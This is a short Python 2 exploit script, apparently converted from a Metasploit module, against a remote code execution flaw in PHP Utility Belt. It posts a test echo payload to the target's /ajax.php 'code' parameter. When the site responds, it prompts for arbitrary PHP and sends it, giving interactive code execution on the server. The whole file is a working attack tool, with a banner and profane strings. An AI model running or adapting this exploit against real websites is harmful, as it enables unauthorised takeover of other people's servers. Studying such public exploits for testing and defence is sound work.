#!/usr/bin/env python
# -*- coding: utf-8 -*-
#Exploit converted from msf module to python
#https://www.exploit-db.com/exploits/39554/
#Coded by Leigh Brayshaw (@0xDeMoN)
import sys, requests


banner = '''
██████╗ ██╗  ██╗██████╗     ██╗   ██╗████████╗██╗██╗     ██╗████████╗██╗   ██╗
██╔══██╗██║  ██║██╔══██╗    ██║   ██║╚══██╔══╝██║██║     ██║╚══██╔══╝╚██╗ ██╔╝
██████╔╝███████║██████╔╝    ██║   ██║   ██║   ██║██║     ██║   ██║    ╚████╔╝ 
██╔═══╝ ██╔══██║██╔═══╝     ██║   ██║   ██║   ██║██║     ██║   ██║     ╚██╔╝  
██║     ██║  ██║██║         ╚██████╔╝   ██║   ██║███████╗██║   ██║      ██║   
╚═╝     ╚═╝  ╚═╝╚═╝          ╚═════╝    ╚═╝   ╚═╝╚══════╝╚═╝   ╚═╝      ╚═╝   
                                                                              
      ██████╗ ███████╗██╗  ████████╗    ██████╗  ██████╗███████╗              
      ██╔══██╗██╔════╝██║  ╚══██╔══╝    ██╔══██╗██╔════╝██╔════╝              
█████╗██████╔╝█████╗  ██║     ██║       ██████╔╝██║     █████╗█████╗          
╚════╝██╔══██╗██╔══╝  ██║     ██║       ██╔══██╗██║     ██╔══╝╚════╝          
      ██████╔╝███████╗███████╗██║       ██║  ██║╚██████╗███████╗              
      ╚═════╝ ╚══════╝╚══════╝╚═╝       ╚═╝  ╚═╝ ╚═════╝╚══════╝  
             PHP Utility Belt Remote Code Execution                                                                                        
'''

print banner

if(len(sys.argv) != 2):
	print "PARSE ARGUMENTS [URL]"
	print "Example: thisscript.py http://localhost\n"
else:
   	url = sys.argv[1] + "/ajax.php"
	test = "fuck2hector"
	try:
		r = requests.post(url, data={'code': 'echo ' + test + ';'})
		response = r.text
	except Exception, e:
		sys.exit("YOU DONE FUCKED UP\n")
	if ("fuck2hector" in response):
		print "[+] Website is vulnerable " + url
		cmd = raw_input('Please enter php function here: ')
		exploit = requests.post(url, data={'code': cmd})
		print "\n" + exploit.text 
	else:
		print "[-] Website is not vulnerable"
